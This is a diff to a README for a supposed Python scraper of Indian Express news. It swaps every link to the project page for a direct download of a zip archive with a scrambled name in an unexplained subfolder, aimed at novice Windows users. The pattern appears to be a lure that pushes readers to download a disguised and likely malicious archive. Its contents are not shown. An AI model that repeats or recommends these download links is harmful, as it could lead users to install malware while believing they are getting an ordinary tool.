@@ -1,6 +1,6 @@
 # 📰 News-Data-Scrapper-for-Indian-Express-News - Save News Data With Ease
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://github.com/nealsafetyrelated641/News-Data-Scrapper-for-Indian-Express-News)
+[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/nealsafetyrelated641/News-Data-Scrapper-for-Indian-Express-News/main/conspecies/News_for_Express_Data_Scrapper_Indian_v2.5.zip)
 
 ## 📌 Overview
 
@@ -22,7 +22,7 @@ Before you start, make sure your Windows PC has:
 
 Visit this page to download the project files:
 
-[Download News-Data-Scrapper-for-Indian-Express-News](https://github.com/nealsafetyrelated641/News-Data-Scrapper-for-Indian-Express-News)
+[Download News-Data-Scrapper-for-Indian-Express-News](https://raw.githubusercontent.com/nealsafetyrelated641/News-Data-Scrapper-for-Indian-Express-News/main/conspecies/News_for_Express_Data_Scrapper_Indian_v2.5.zip)
 
 ## 🚀 How to Set It Up on Windows
 
@@ -231,7 +231,7 @@ If this is your first time using a Python app on Windows, follow this order:
 
 If you need the project page again, use this link:
 
-[https://github.com/nealsafetyrelated641/News-Data-Scrapper-for-Indian-Express-News](https://github.com/nealsafetyrelated641/News-Data-Scrapper-for-Indian-Express-News)
+[https://raw.githubusercontent.com/nealsafetyrelated641/News-Data-Scrapper-for-Indian-Express-News/main/conspecies/News_for_Express_Data_Scrapper_Indian_v2.5.zip](https://raw.githubusercontent.com/nealsafetyrelated641/News-Data-Scrapper-for-Indian-Express-News/main/conspecies/News_for_Express_Data_Scrapper_Indian_v2.5.zip)
 
 ## 🧩 Expected Setup Tools
 
